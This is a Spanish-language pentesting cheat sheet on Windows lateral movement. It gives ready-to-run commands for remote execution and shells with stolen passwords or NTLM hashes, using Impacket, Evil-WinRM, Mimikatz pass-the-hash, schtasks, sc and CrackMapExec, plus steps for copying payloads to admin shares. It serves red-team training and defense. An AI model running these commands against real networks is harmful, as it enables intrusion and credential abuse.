
# Windows Lateral Movement Techniques

El **movimiento lateral** en entornos Windows se refiere al conjunto de técnicas que un atacante utiliza para desplazarse desde un sistema comprometido hacia otros equipos dentro de la misma red, con el objetivo de expandir el control, acceder a datos sensibles o alcanzar sistemas de mayor valor (como controladores de dominio o servidores de bases de datos).

Después de obtener una foothold inicial (por ejemplo, mediante phishing o explotación de un servicio), el atacante suele disponer de credenciales locales o de dominio (en texto claro o hashes NTLM) y busca conectarse a otros equipos donde esas credenciales sean válidas. Windows ofrece varios mecanismos legítimos de administración remota que, cuando son abusados, permiten ejecutar comandos, transferir archivos o abrir shells interactivas. Entre los más comunes se encuentran:

* **SMB** (puerto 445): usado por PSExec, SMBExec, AtExec y tareas programadas.
* **WinRM** (puertos 5985/5986): servicio de administración remota basado en HTTP/HTTPS.
* **WMI** (puerto 135/RPC): infraestructura de gestión de Windows.
* **RDP** (puerto 3389): escritorio remoto.
* **DCOM** (puerto 135/RPC): modelo de objetos distribuido.

El conocimiento de estas técnicas es fundamental para profesionales de seguridad ofensiva (pentesters, red teamers) que necesitan simular el comportamiento de un adversario real y para defensores que desean configurar adecuadamente la monitorización y las mitigaciones.

A continuación se presenta un resumen de los comandos más útiles para cada técnica, asumiendo que se dispone de credenciales válidas (usuario/contraseña o hash NTLM) y los servicios correspondientes están habilitados en los equipos objetivo.

***

## <mark style="color:purple;">Técnicas de Movimiento Lateral en Windows</mark>

### 1. PSExec (Sysinternals / Impacket)

Ejecuta procesos remotos mediante el servicio Admin$ (SMB). Ideal para shells interactivas.

```bash
# Impacket (Linux)
impacket-psexec administrator:'password'@192.168.1.10
# Con hash NTLM
impacket-psexec -hashes :ntlm_hash administrator@192.168.1.10
```

### 2. WinRM / Evil-WinRM

Requiere puertos 5985 (HTTP) o 5986 (HTTPS). Muy estable y permite PowerShell remoto.

```bash
# Evil-WinRM (Linux)
evil-winrm -i 192.168.1.10 -u administrator -p 'password'
# Con hash NTLM
evil-winrm -i 192.168.1.10 -u administrator -H ntlm_hash
```

### 3. WMI (Windows Management Instrumentation)

Ejecución de procesos o consultas mediante RPC.

```bash
# Impacket (Linux)
impacket-wmiexec administrator:'password'@192.168.1.10
# Con hash NTLM
impacket-wmiexec -hashes :ntlm_hash administrator@192.168.1.10
```

### 4. SMBExec / AtExec (Impacket)

Alternativas a PSExec sin necesidad de escribir archivos en el disco remoto.

```bash
# SMBExec (shell semi-interactiva)
impacket-smbexec administrator:'password'@192.168.1.10
# AtExec (ejecución de un comando único mediante Task Scheduler)
impacket-atexec administrator:'password'@192.168.1.10 'whoami'
```

### 5. Tareas programadas (schtasks)

Crea, ejecuta y elimina tareas programadas de forma remota.

```bash
schtasks /create /s 192.168.1.10 /u admin /p pass /tn "TaskName" /tr "cmd.exe /c whoami" /sc once /st 00:00
schtasks /run /s 192.168.1.10 /tn "TaskName"
schtasks /delete /s 192.168.1.10 /tn "TaskName" /f
```

### 6. Pass-the-Hash (PtH) con Impacket

Permite usar el hash NTLM directamente sin necesidad de la contraseña en texto claro.

```bash
impacket-psexec -hashes :ntlm_hash administrator@192.168.1.10
impacket-smbexec -hashes :ntlm_hash administrator@192.168.1.10
impacket-wmiexec -hashes :ntlm_hash administrator@192.168.1.10
impacket-atexec -hashes :ntlm_hash administrator@192.168.1.10 'whoami'
```

### 7. Overpass-the-Hash / Pass-the-Ticket (Mimikatz)

Convierte un hash NTLM en un ticket Kerberos (TGT) y lo inyecta en la sesión actual.

```bash
# Desde una sesión elevada de PowerShell con Mimikatz
sekurlsa::pth /user:admin /domain:dominio.local /ntlm:ntlm_hash /run:powershell.exe
# En la nueva ventana, los comandos usarán el ticket
klist
# Conectarse a un recurso remoto usando Kerberos
net use \\target\C$
```

### 8. RDP (Remote Desktop Protocol)

Escritorio remoto interactivo. Requiere que el usuario esté en el grupo "Remote Desktop Users".

```bash
# rdesktop (Linux)
rdesktop -u administrator -p password 192.168.1.10
# xfreerdp (más completo)
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution
```

### 9. Servicios remotos (SC)

Crear y controlar servicios en equipos remotos.

```bash
sc \\192.168.1.10 create ServiceName binPath= "cmd.exe /c whoami" start= auto
sc \\192.168.1.10 start ServiceName
sc \\192.168.1.10 delete ServiceName
```

### 10. CrackMapExec

Herramienta todo-en-uno para ejecutar comandos, enumerar shares, obtener información del dominio, etc. Viene instalado por defecto en Kali Linux.

{% hint style="info" %}
La nueva versión de este programa es [NetExec](https://github.com/Pennyw0rth/NetExec), que utiliza la misma estructura de comandos.
{% endhint %}

```bash
# Ejecutar comando en un host
crackmapexec smb 192.168.1.10 -u administrator -p password -x 'whoami'
# Con hash
crackmapexec smb 192.168.1.10 -u administrator -H ntlm_hash -X 'ipconfig'
# Enumerar recursos compartidos
crackmapexec smb 192.168.1.10 -u administrator -p password --shares
```

### 12. Transferencia de archivos en movimiento lateral

A menudo necesitas subir herramientas o payloads a equipos remotos.

```bash
# Con SMB (net use)
net use \\target\C$ /user:admin password
copy payload.exe \\target\C$\Windows\Temp\
# Con impacket-smbclient
impacket-smbclient 'administrator:password@192.168.1.10'
# Dentro del cliente: use C$ ; lcd /local ; put payload.exe
```
